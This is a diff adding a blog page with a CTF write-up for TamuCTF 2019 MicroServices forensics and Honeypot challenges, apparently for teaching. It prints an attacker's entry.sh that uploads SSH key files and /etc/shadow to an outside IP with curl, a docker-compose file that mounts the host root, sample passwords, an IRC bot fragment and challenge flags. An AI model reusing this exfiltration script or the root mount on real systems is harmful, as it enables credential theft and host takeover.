+      - DATABASE_URL=mysql+pymysql://root:351BrE7aTQE8@db/customers
+      - REDIS_URL=redis://cache:6379
+    volumes:
+      - ./logs:/var/log/apache2
+      - /:/tmp
+    depends_on:
+      - db
+    networks:
+        default:
+        internal:
+
+  db:
+    image: mariadb:10.2
+    restart: always
+    environment:
+      - MYSQL_ROOT_PASSWORD=351BrE7aTQE8
+      - MYSQL_USER=user
+      - MYSQL_PASSWORD=e68Qc2s0HsyR
+    volumes:
+      - .data/mysql:/var/lib/mysql
+    networks:
+        internal:
+    # This command is required to set important mariadb defaults
+    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]
+
+  cache:
+    image: redis:4
+    restart: always
+    volumes:
+    - .data/redis:/data
+    networks:
+        internal:
+
+networks:
+    default:
+    internal:
+        internal: true
+</code></pre>
+
+<p>If you&rsquo;re a little familiar with Docker, you&rsquo;ve already found out where the attacker went. Line 13 of the file, the user is mounting the root directory in the /tmp folder of the container:</p>
+
+<pre><code>- /:/tmp
+</code></pre>
+
+<p>As a result, the attacker compromised the webfront and got access to the  host filesystem as <code>root</code> user. So he was able to retrieve the SSH private key from the host and logged in with.</p>
+
+<p>The MD5 hash of the docker-composer.yml:</p>
+
+<pre><code class="language-bash">➜  microservices md5sum aaa/home/ubuntu/docker-compose.yml
+a2111283f69aafcd658f558b0402fbc4  aaa/home/ubuntu/docker-compose.yml
+</code></pre>
+
+<pre><code>Flag 1: docker
+Flag 2: a2111283f69aafcd658f558b0402fbc4
+Flag 3: - /:/tmp
+</code></pre>
+
+<h3 id="3-forensics">3_Forensics</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>3_Forensics</td>
+<td>MicroServices</td>
+<td>100</td>
+<td>~27</td>
+</tr>
+</tbody>
+</table>
+
+<blockquote>
+<p>Thanks for that information. It seems that one of our developers didn&rsquo;t pay attention to what he was copying off of the internet. Can you help use figure out the extent of what the attacker was able to do?</p>
+</blockquote>
+
+<pre><code>- What are the last names of customers who got compromised? (alphabetical order, Capitalized first letter, comma separated ex: Asdf,Bsdf)
+- What is the md5sum of the file that was used to exfiltrate data initially?
+- What is the md5sum of the file that was stolen after the attacker logged in?
+</code></pre>
+
+<p>Something to know when you&rsquo;re doing forensic work with docker is: absolutely ALL about containers and other files/information related to this service is located here: <code>/var/lib/docker</code>.</p>
+
+<p>Let&rsquo;s list the docker containers that have been used. We&rsquo;ll go looking for the one who climbs the root in the /tmp folder of the container:</p>
+
+<pre><code class="language-bash">➜  microservices ls aaa/var/lib/docker/containers 
+90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e
+9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4
+c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da
+c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84
+</code></pre>
+
+<p>Each container created contains a configuration file in JSON:</p>
+
+<pre><code class="language-bash">➜  microservices ls aaa/var/lib/docker/containers/*/config*
+aaa/var/lib/docker/containers/90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e/config.v2.json
+aaa/var/lib/docker/containers/9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4/config.v2.json
+aaa/var/lib/docker/containers/c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da/config.v2.json
+aaa/var/lib/docker/containers/c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84/config.v2.json
+
+➜  microservices cat aaa/var/lib/docker/containers/*/config.v2.json | jq | grep -E '&quot;ID&quot;|&quot;Image&quot;'
+  &quot;ID&quot;: &quot;90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e&quot;,
+    &quot;Image&quot;: &quot;tamuctf/kaliimage&quot;,
+  &quot;Image&quot;: &quot;sha256:420f4338bea593a9a96151c51b3f5550fac8f7c29cb41c451b4d07c02cf9b28d&quot;,
+  &quot;ID&quot;: &quot;9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4&quot;,
+    &quot;Image&quot;: &quot;redis:4&quot;,
+  &quot;Image&quot;: &quot;sha256:3ddb7885a5e075ba8ed414d0706059999aa73fceb4249bef7cb293c1ec559dfc&quot;,
+  &quot;ID&quot;: &quot;c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da&quot;,
+    &quot;Image&quot;: &quot;mariadb:10.2&quot;,
+  &quot;Image&quot;: &quot;sha256:907f5f6c749d16ddd8f4a75353228a550d8eddd78693f4329c90ce51a99ec875&quot;,
+  &quot;ID&quot;: &quot;c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84&quot;,
+    &quot;Image&quot;: &quot;tamuctf/webfront:latest&quot;,
+  &quot;Image&quot;: &quot;sha256:05585189bd6cb140d5fcee52b95a05a202f3aa2ae62743a749d0d82bcacfbc5c&quot;,
+</code></pre>
+
+<p>A surprising image is here: <strong>kaliimage</strong>. Image Docker which has nothing to do on a web server&hellip;</p>
+
+<p>In the <code>/var/lib/lib/docker/overlay2/</code> folder there are all the intermediate versions of the docker containers, in the form of a hash. Kind of like the commits for GitHub.</p>
+
+<pre><code class="language-bash">➜  microservices ls aaa/var/lib/docker/overlay2 
+030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f
+06aa47c261686f54296a2da65bfea7ed577ff79ce2263a320c95f73e2ad51db1
+0bdd99e71211b7d42c48fc86936089b1766af62159e78554434d3b7762f88bb4
+0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848
+101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68
+146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d
+[...]
+</code></pre>
+
+<p>Each of these folders has the same architecture:</p>
+
+<pre><code class="language-bash">➜  microservices tree aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f 
+aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f
+├── diff
+│   └── etc
+│       └── apt
+│           └── sources.list
+├── link
+├── lower
+└── work
+</code></pre>
+
+<p>The folder that will interest us will be the <code>diff</code> one, which bears its name well because it will record the differences between each container version. That&rsquo;s why Docker quickly becomes greedy in terms of disk size.</p>
+
+<p>To find what interests me, I did something not very skilled, but which has is exhaustive:</p>
+
+<pre><code class="language-bash">➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
+aaa/var/lib/docker/overlay2/0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848/diff/:
+etc  tmp  usr  var
+
+aaa/var/lib/docker/overlay2/101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68/diff/:
+etc  var
+
+aaa/var/lib/docker/overlay2/146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d/diff/:
+etc  lib  tmp  usr  var
+
+aaa/var/lib/docker/overlay2/146d15695f9f4187544729bbd71682fe0fcebce1cd65becfc74f64f3278ea370/diff/:
+run
+
+aaa/var/lib/docker/overlay2/146d15695f9f4187544729bbd71682fe0fcebce1cd65becfc74f64f3278ea370-init/diff/:
+dev  etc
+[LOT OF RESUUUUUUUUULT]
+</code></pre>
+
+<p>But at a quick glance, I saw that an <code>entry.sh</code> file had been modified, nothing else on the docker&rsquo;s filesystem:</p>
+
+<pre><code class="language-bash">➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
+[...]
+aaa/var/lib/docker/overlay2/5d6f4f20fa15dd9d3960358e9b6e257821e3ab277a6ff4db92163d926e5c5e8a/diff/:
+entry.sh
+[...]
+
+➜  microservices cat aaa/var/lib/docker/overlay2/5d6f4f20fa15dd9d3960358e9b6e257821e3ab277a6ff4db92163d926e5c5e8a/diff/entry.sh 
+#!/bin/sh
+
+if [ -n &quot;$DATABASE_URL&quot; ]
+    then
+    database=`echo $DATABASE_URL | awk -F[@//] '{print $4}'`
+    echo &quot;Waiting for $database to be ready&quot;
+    while ! mysqladmin ping -h $database --silent; do
+        # Show some progress
+        echo -n '.';
+        sleep 1;
+    done
+    echo &quot;$database is ready&quot;
+    # Give it another second.
+    sleep 1;
+fi
+
+mysql -uroot -h db -p351BrE7aTQE8 -e 'CREATE DATABASE customers;\
+                                USE customers;\
+                                CREATE TABLE customer_info(LastName varchar(255), FirstName varchar(255), Email varchar(255), CreditCard varchar(255), Password varchar(255));\
+                                INSERT INTO customer_info VALUES (&quot;Meserole&quot;, &quot;Andrew&quot;, &quot;A@A.com&quot;, &quot;378282246310005&quot;, &quot;badpass1&quot;);\
+                                INSERT INTO customer_info VALUES (&quot;Billy&quot;, &quot;Bob&quot;, &quot;B@A.com&quot;, &quot;371449635398431&quot;, &quot;badpass2&quot;);\
+                                INSERT INTO customer_info VALUES (&quot;Suzy&quot;, &quot;Joe&quot;, &quot;S@A.com&quot;, &quot;378734493671000&quot;, &quot;badpass3&quot;);\
+                                INSERT INTO customer_info VALUES (&quot;John&quot;, &quot;Doe&quot;, &quot;J@A.com&quot;, &quot;6011000990139424&quot;, &quot;badpass4&quot;);\
+                                INSERT INTO customer_info VALUES (&quot;Frank&quot;, &quot;Ferter&quot;, &quot;F@A.com&quot;, &quot;3566002020360505&quot;, &quot;badpass5&quot;);\
+                                INSERT INTO customer_info VALUES (&quot;Orange&quot;, &quot;Chair&quot;, &quot;O@A.com&quot;, &quot;4012888888881881&quot;, &quot;badpass6&quot;);\
+                                INSERT INTO customer_info VALUES (&quot;Face&quot;, &quot;Book&quot;, &quot;C@A.com&quot;, &quot;5105105105105100&quot;, &quot;badpass7&quot;);\'
+
+find /tmp/home -type d -name &quot;.ssh&quot; 2&gt; /dev/null &gt; /tmp/ljkasdhg
+find /tmp/root -type d -name &quot;.ssh&quot; 2&gt; /dev/null &gt;&gt; /tmp/ljkasdhg
+
+sleep 2m;
+
+while read line; do
+    find $line -type f -exec curl -k -F 'data=@{}' https://10.91.9.93/ \;
+done &lt; /tmp/ljkasdhg
+
+curl -k -F 'data=@/tmp/etc/shadow' https://10.91.9.93/
+
+service apache2 stop;
+apache2 -D FOREGROUND;
+</code></pre>
+
+<p><center>
+<img src="https://media.giphy.com/media/K90ckojkohXfW/giphy.gif" alt="" />
+</center></p>
+
+<p>It&rsquo;s Christmas, we found the file modified by the attacker and what allowed him to do yolo with the system. He modified database entries, retrieved <code>/etc/shadow</code>, information about users&rsquo; <code>.ssh</code> folders.</p>
+
+<p>The compromised users are therefore:</p>
+
+<pre><code>Flag 1: Billy,Face,Frank,John,Meserole,Orange,Suzy
+</code></pre>
+
+<p>The file that was used to extract data from the data is therefore <code>entry.sh</code>:</p>
+
+<pre><code>Flag 2: 14b0d800ce6f2882a6f058b45fc500c8
+</code></pre>
+
+<p>Still in the same perspective as to find the <code>entry.sh</code>, I listed the diff folders. In fact, I thought we were looking for a SQL backup or something like that, modifying a database without getting the backups is like ransomware that doesn&rsquo;t delete clear files&hellip;</p>
+
+<pre><code class="language-bash">➜  microservices ls aaa/var/lib/docker/overlay2/*/diff/
+[...]
+aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/:
+data-dump.sql  run  tmp
+[...]
+
+➜  microservices cat aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
+[BAD IDEA TOO MUCH DATA]
+
+➜  microservices md5sum aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
+6d47d74d66e96c9bce2720c8a56f2558  aaa/var/lib/docker/overlay2/e714d5d9a9c2b274dc598376078e089556081865d541bfa9aef768b1982ba0b3/diff/data-dump.sql
+</code></pre>
+
+<pre><code>Flag 3: 6d47d74d66e96c9bce2720c8a56f2558
+</code></pre>
+
+<h3 id="4-persistence">4_Persistence</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>4_Persistence</td>
+<td>MicroServices</td>
+<td>100</td>
+<td>~25</td>
+</tr>
+</tbody>
+</table>
+
+<blockquote>
+<p>Thanks for that information. We are working on how to recover from this breach. One of the things we need to do is remove any backdoors placed by the attacker. Can you identify what the attacker left behind?</p>
+</blockquote>
+
+<pre><code>- What is the new user that was created?
+- What is the full name of the new docker image that was pulled down?
+</code></pre>
+
+<p>This challenge was rather simple given the information found earlier. In step 2 (2_Analysis), I saw that the $HOME of the <code>dev</code> user is <code>/root</code>, so we suspect that it is the new user :</p>
+
+<pre><code>Flag 1: dev
+</code></pre>
+
+<p>Then, when I started investigating on docker containers (cf. 3_Forensics), I saw an image <strong>Kali</strong> named: <code>tamuctf/kaliimage</code>.</p>
+
+<pre><code>Flag 2: tamuctf/kaliimage
+</code></pre>
+
+<hr />
+
+<h2 id="honeypot">Honeypot</h2>
+
+<p>This part of the writeup will go pretty fast, it&rsquo;s just parsing in the end. All challenges are in the following archive:</p>
+
+<p>Password for the archive: tamuctf</p>
+
+<table>
+<thead>
+<tr>
+<th>Filename</th>
+<th>MD5 Hash</th>
+<th>Download link</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>honeypot2.7z</td>
+<td>b08992d50e5885f6db8cf50f22eefab4</td>
+<td><a href="https://drive.google.com/uc?id=1lhYsk97AgYDMxzfz1r6FzUs28sugZUR0&amp;export=download">https://drive.google.com/uc?id=1lhYsk97AgYDMxzfz1r6FzUs28sugZUR0&amp;export=download</a></td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>Warning this challenge contains some malware samples.</strong></p>
+
+<h3 id="cowrie">Cowrie</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>Cowrie</td>
+<td>Honeypot</td>
+<td>100</td>
+<td>~108</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What was the most common src ip (telnet &amp; ssh)?
+- What was the most common telnet username?
+- What was the most common ssh username?
+- What is the url and channel of the IRC server that the one downloaded script tried to connect to? (url, channel)
+</code></pre>
+
+<p>In order to find the most used IP address for telnet and ssh, I just count, sort and print the first line:</p>
+
+<pre><code class="language-bash">▶ cat cowrie.json.2018*| jq | grep &quot;src_ip&quot; | sort | uniq -c | sort -nr | head -n 1
+  21011   &quot;src_ip&quot;: &quot;211.143.198.161&quot;,
+</code></pre>
+
+<pre><code>Flag 1: 211.143.198.161
+</code></pre>
+
+<p>Some things for flag 2 and 3:</p>
+
+<pre><code class="language-bash">▶ cat cowrie.json.2018* | jq | grep username | sort | uniq -c | sort -nr | head -n 2
+  12998   &quot;username&quot;: &quot;root&quot;,
+   9626   &quot;username&quot;: &quot;admin&quot;,
+</code></pre>
+
+<pre><code>Flag 2: root
+Flag 3: admin
+</code></pre>
+
+<p>Cowrie is saving all binaries / scripts or whatever dropped by the attacker, I&rsquo;m able to find it in download folder:</p>
+
+<pre><code class="language-bash">▶ file cowrie/downloads/d3f074230f4b62a4d2a8d50a5df9a51d6fe20a8d3b27c1ff9459cdbc531f489d 
+cowrie/downloads/d3f074230f4b62a4d2a8d50a5df9a51d6fe20a8d3b27c1ff9459cdbc531f489d: a /usr/bin/perl script executable (binary data)
+
+▶ cat d3f074230f4b62a4d2a8d50a5df9a51d6fe20a8d3b27c1ff9459cdbc531f489d | sed '/^[[:space:]]*$/d'
+</code></pre>
+
+<pre><code class="language-perl">[...]
+$server = 'irc.quakenet.org' unless $server;
+my $port = '6667';
+my $linas_max='8';
+my $sleep='5';
+my $homedir = &quot;/tmp&quot;;
+my $version = 'Undernet Perl Bot v1.0';
+my @admins = (&quot;gov&quot;,&quot;gov-&quot;,&quot;fucker-&quot;,&quot;fucker&quot;,&quot;op&quot;);
+my @hostauth = (&quot;fucker.users.quakenet.org&quot;,&quot;gov.users.quakenet.org&quot;,&quot;cker.pro&quot;);
+my @channels = (&quot;#bookz&quot;);
+[...]
+</code></pre>
+
+<pre><code>Flag 4: irc.quakenet.org, bookz
+</code></pre>
+
+<h3 id="dionaea">Dionaea</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>Dionaea</td>
+<td>Honeypot</td>
+<td>100</td>
+<td>~85</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What was the most common src ip?
+- What is the common name for the most commonly downloaded malware?
+</code></pre>
+
+<pre><code class="language-bash">▶ cat dionaea/log/dionaea.json.* | jq | grep 'src_ip' | sort | uniq -c | sort -nr | head -n 1
+    128   &quot;src_ip&quot;: &quot;::ffff:193.56.29.24&quot;,
+</code></pre>
+
+<pre><code>Flag 1: 193.56.29.24
+</code></pre>
+
+<p>Lots of binaries are stored by the honeypot. I just generate md5sum for all of them and check the first one on <a href="https://virustotal.com">VirusTotal</a>:</p>
+
+<pre><code class="language-bash">▶ md5sum dionaea/binaries/data/dionaea/binaries/*
+0ab2aeda90221832167e5127332dd702  dionaea/binaries/data/dionaea/binaries/0ab2aeda90221832167e5127332dd702
+1533a4e55cee10a9487e4b13abff4688  dionaea/binaries/data/dionaea/binaries/1533a4e55cee10a9487e4b13abff4688
+1a400481251fac98bc574c0aed7beca8  dionaea/binaries/data/dionaea/binaries/1a400481251fac98bc574c0aed7beca8
+20b431c101855960614b21e4c1b26451  dionaea/binaries/data/dionaea/binaries/20b431c101855960614b21e4c1b26451
+2622e5c9ac05ed71ab35606493627c13  dionaea/binaries/data/dionaea/binaries/2622e5c9ac05ed71ab35606493627c13
+2de98404eb4ac4a525ed1884f4ea445b  dionaea/binaries/data/dionaea/binaries/2de98404eb4ac4a525ed1884f4ea445b
+[...]
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/tamuctf2019/honeypot/dionaea/chall21.png" alt="" />
+<em>Fig 8</em>: Malware sample analysis on VT
+</center></p>
+
+<p>According to Avira:</p>
+
+<pre><code>Flag 3: wannacry
+</code></pre>
+
+<h3 id="glastopf">Glastopf</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>Glastopf</td>
+<td>Honeypot</td>
+<td>100</td>
+<td>~70</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What was the most common src ip?
+- What are the three most commonly requested url besides / get or post? (no slashes, all lowercase, alphabetical (1.ext, a.ext, b.ext))
+</code></pre>
+
+<p>In this honeypot logs are not stored in JSON format&hellip; So I had to parse them with <code>cut</code>.</p>
+
+<pre><code class="language-bash">▶ cat glastopf/log/glastopf.log.* | cut -d&quot; &quot; -f4 | sort | uniq -c | sort -nr | head -n 1
+    274 85.121.16.8
+</code></pre>
+
+<pre><code>Flag 1: 85.121.16.8
+</code></pre>
+
+<pre><code class="language-bash">▶ cat glastopf/log/glastopf.log.* | cut -d&quot; &quot; -f7 | sort | uniq -c | sort -nr | head -n 4
+     96 /
+     20 /qq.php
+     20 /confg.php
+     20 /1.php
+</code></pre>
+
+<pre><code>Flag 2: 1.php, confg.php, qq.php
+</code></pre>
+
+<h3 id="honeytrap">Honeytrap</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>Honeytrap</td>
+<td>Honeypot</td>
+<td>100</td>
+<td>~75</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What was the most common src ip?
+- What was the most common user agent?
+- What was the second most common user agent?
+</code></pre>
+
+<p>As the previous honeypot, logs are not stored as json file, so I <code>cut</code> them and doing some <code>sed</code> stuff in order to remove all associate ports, I only need IP address:</p>
+
+<pre><code class="language-bash">▶ cat honeytrap/log/attacker.log| cut -d&quot; &quot; -f5 | sed 's/:.*//' | uniq | sort | uniq -c | sort -nr | head -n 1
+      9 5.188.210.12
+</code></pre>
+
+<pre><code>Flag 1: 5.188.210.12
+</code></pre>
+
+<p>For two most common user-agent:</p>
+
+<pre><code class="language-bash">▶ cat honeytrap/attacks/* | grep -a 'User-Agent' | sort | uniq -c | sort -nr | head -n 2
+     28 User-Agent: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-696.30.1.el6.x86_64
+     11 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+</code></pre>
+
+<pre><code>Flag 2: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-696.30.1.el6.x86_64
+Flag 3: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+</code></pre>
+
+<h3 id="suricata">Suricata</h3>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>TamuCTF 2019</td>
+<td>Suricata</td>
+<td>Honeypot</td>
+<td>100</td>
+<td>~89</td>
+</tr>
+</tbody>
+</table>
+
+<pre><code>- What CVE was alerted for the most?
+- What was the most common signature?
+</code></pre>
+
+<p>JSON logs, great.</p>
+
+<pre><code class="language-bash">▶ cat suricata/log/suricata_ews.log.* | jq | grep &quot;cve_id&quot; | sort | uniq -c | sort -nr | head -n 1
+   1527     &quot;cve_id&quot;: &quot;CVE-2006-2369&quot;,
+</code></pre>
+
+<pre><code>Flag 1: CVE-2006-2369
+</code></pre>
+
+<p>There are <strong>signature</strong> pattern in both log files (eve.json and suricata_ews.log), then:</p>
+
+<pre><code class="language-bash">▶ cat suricata/log/* | jq | grep 'signature&quot;' | sort | uniq -c | sort -nr | head -n 1
+1426173     &quot;signature&quot;: &quot;ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication&quot;,
+</code></pre>
+
+<pre><code>Flag 2: ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
+</code></pre>
+
+	</div>
+</article>
+
+		</div>
+		
+	
+<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
+	
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+	
+
+
+	<script>
+    (function() {
+      var toc = document.getElementById('TableOfContents');
+      if (!toc) return;
+      do {
+        var li, ul = toc.querySelector('ul');
+        if (ul.childElementCount !== 1) break;
+        li = ul.firstElementChild;
+        if (li.tagName !== 'LI') break;
+        
+        ul.outerHTML = li.innerHTML;
+      } while (toc.childElementCount >= 1);
+    })();
+  </script>
+
+	</body>
+</html>
